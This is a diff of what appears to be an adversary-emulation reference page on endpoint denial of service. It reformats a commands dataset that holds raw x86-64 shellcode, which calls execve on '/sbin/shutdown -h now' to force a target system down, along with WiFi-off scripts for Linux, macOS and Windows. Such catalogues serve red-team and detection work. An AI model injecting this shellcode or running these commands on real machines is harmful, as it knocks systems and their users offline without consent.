@@ -40,90 +40,31 @@ For attacks attempting to saturate the providing network, see [Network Denial of
 ## Potential Commands
 
 ```
-{'linux': {'shellcode_amd64,shellcode_386': {'command': '0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n'}}}
-{'darwin': {'sh': {'command': './wifi.sh off\n', 'cleanup': './wifi.sh on\n', 'payloads': ['wifi.sh']}}, 'linux': {'sh': {'command': './wifi.sh off\n', 'cleanup': './wifi.sh on\n', 'payloads': ['wifi.sh']}}, 'windows': {'psh': {'command': '.\\wifi.ps1 -Off\n', 'cleanup': '.\\wifi.ps1 -On\n', 'payloads': ['wifi.ps1']}}}
+0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05
+./wifi.sh off
+.\wifi.ps1 -Off
 ```
 
 ## Commands Dataset
 
 ```
-[{'command': {'linux': {'shellcode_amd64,shellcode_386': {'command': '0x48, '
-                                                                     '0x31, '
-                                                                     '0xc0, '
-                                                                     '0x48, '
-                                                                     '0x31, '
-                                                                     '0xd2, '
-                                                                     '0x50, '
-                                                                     '0x6a, '
-                                                                     '0x77, '
-                                                                     '0x66, '
-                                                                     '0x68, '
-                                                                     '0x6e, '
-                                                                     '0x6f, '
-                                                                     '0x48, '
-                                                                     '0x89, '
-                                                                     '0xe3, '
-                                                                     '0x50, '
-                                                                     '0x66, '
-                                                                     '0x68, '
-                                                                     '0x2d, '
-                                                                     '0x68, '
-                                                                     '0x48, '
-                                                                     '0x89, '
-                                                                     '0xe1, '
-                                                                     '0x50, '
-                                                                     '0x49, '
-                                                                     '0xb8, '
-                                                                     '0x2f, '
-                                                                     '0x73, '
-                                                                     '0x62, '
-                                                                     '0x69, '
-                                                                     '0x6e, '
-                                                                     '0x2f, '
-                                                                     '0x2f, '
-                                                                     '0x2f, '
-                                                                     '0x49, '
-                                                                     '0xba, '
-                                                                     '0x73, '
-                                                                     '0x68, '
-                                                                     '0x75, '
-                                                                     '0x74, '
-                                                                     '0x64, '
-                                                                     '0x6f, '
-                                                                     '0x77, '
-                                                                     '0x6e, '
-                                                                     '0x41, '
-                                                                     '0x52, '
-                                                                     '0x41, '
-                                                                     '0x50, '
-                                                                     '0x48, '
-                                                                     '0x89, '
-                                                                     '0xe7, '
-                                                                     '0x52, '
-                                                                     '0x53, '
-                                                                     '0x51, '
-                                                                     '0x57, '
-                                                                     '0x48, '
-                                                                     '0x89, '
-                                                                     '0xe6, '
-                                                                     '0x48, '
-                                                                     '0x83, '
-                                                                     '0xc0, '
-                                                                     '0x3b, '
-                                                                     '0x0f, '
-                                                                     '0x05\n'}}},
+[{'command': '0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, '
+             '0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, '
+             '0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, '
+             '0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, '
+             '0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, '
+             '0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, '
+             '0x83, 0xc0, 0x3b, 0x0f, 0x05\n',
   'name': 'Force shutdown a target system using Process Injection and raw '
           'shellcode',
   'source': 'data/abilities/impact/0821b0b0-7902-4a7b-8052-80bda5a43684.yml'},
- {'command': {'darwin': {'sh': {'cleanup': './wifi.sh on\n',
-                                'command': './wifi.sh off\n',
-                                'payloads': ['wifi.sh']}},
-              'linux': {'sh': {'cleanup': './wifi.sh on\n',
-                               'command': './wifi.sh off\n',
-                               'payloads': ['wifi.sh']}},
-              'windows': {'psh': {'cleanup': '.\\wifi.ps1 -On\n',
-                                  'command': '.\\wifi.ps1 -Off\n',
-                                  'payloads': ['wifi.ps1']}}},
+ {'command': './wifi.sh off\n',
+  'name': 'Turn a computers WIFI off',
+  'source': 'data/abilities/impact/2fe2d5e6-7b06-4fc0-bf71-6966a1226731.yml'},
+ {'command': './wifi.sh off\n',
+  'name': 'Turn a computers WIFI off',
+  'source': 'data/abilities/impact/2fe2d5e6-7b06-4fc0-bf71-6966a1226731.yml'},
+ {'command': '.\\wifi.ps1 -Off\n',
   'name': 'Turn a computers WIFI off',
   'source': 'data/abilities/impact/2fe2d5e6-7b06-4fc0-bf71-6966a1226731.yml'}]
 ```
